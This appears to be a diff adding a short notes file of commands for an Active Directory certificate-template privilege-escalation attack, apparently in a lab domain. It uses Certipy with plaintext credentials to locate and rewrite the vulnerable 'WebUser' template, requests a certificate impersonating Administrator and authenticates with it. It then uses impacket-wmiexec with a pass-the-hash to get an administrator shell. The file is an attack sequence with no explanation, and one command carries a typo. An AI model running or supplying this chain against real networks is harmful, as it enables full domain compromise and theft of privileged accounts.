@@ -1,0 +1,15 @@
+certipy-ad -debug find -u 'Bob' -p 'b0b1sH@cker' -dc-ip 10.39.150.12 -vulnerable -stdout  
+
+ertipy-ad -debug template -u Bob -p b0b1sH@cker -dc-ip 10.39.150.12 -template  'WebUser'  -save-configuration WebUser_original.json
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+certipy-ad -debug template -u Bob -p b0b1sH@cker -dc-ip 10.39.150.12 -template  'WebUser'  -write-default-configuration             
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+certipy-ad -debug req -u Bob -p b0b1sH@cker -dc-ip 10.39.150.12 -ca CA-CYBER -template  'WebUser'  -upn Administrator@corp.local
+
+certipy-ad auth -pfx ./administrator.pfx -u Admin -dc-ip 10.39.150.12 
+
+ certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.39.150.12  
+ 
+ impacket-wmiexec -hashes :a492a771ae284edd204f69987116fe4f 'corp.local/administrator@10.39.150.12'
